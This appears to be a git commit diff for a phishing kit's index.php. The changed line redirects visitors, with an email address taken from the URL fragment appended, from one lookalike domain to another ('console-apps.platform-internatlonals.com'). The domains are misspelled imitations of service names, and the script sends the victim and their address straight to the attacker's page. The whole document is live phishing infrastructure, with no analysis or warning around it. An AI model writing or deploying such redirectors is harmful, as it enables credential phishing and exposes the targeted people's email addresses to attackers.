340285501374d65c829b01010504f99efe4b76ed
aestevez12 <114561487+aestevez12@users.noreply.github.com>
2022-09-28 11:53:34 +0200

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://organization-tools.quailfiedcareservices.co.uk"+ "#" + em;
+			window.location.href = "https://console-apps.platform-internatlonals.com"+ "#" + em;
 		}, 0);
 	</script>
 </html>
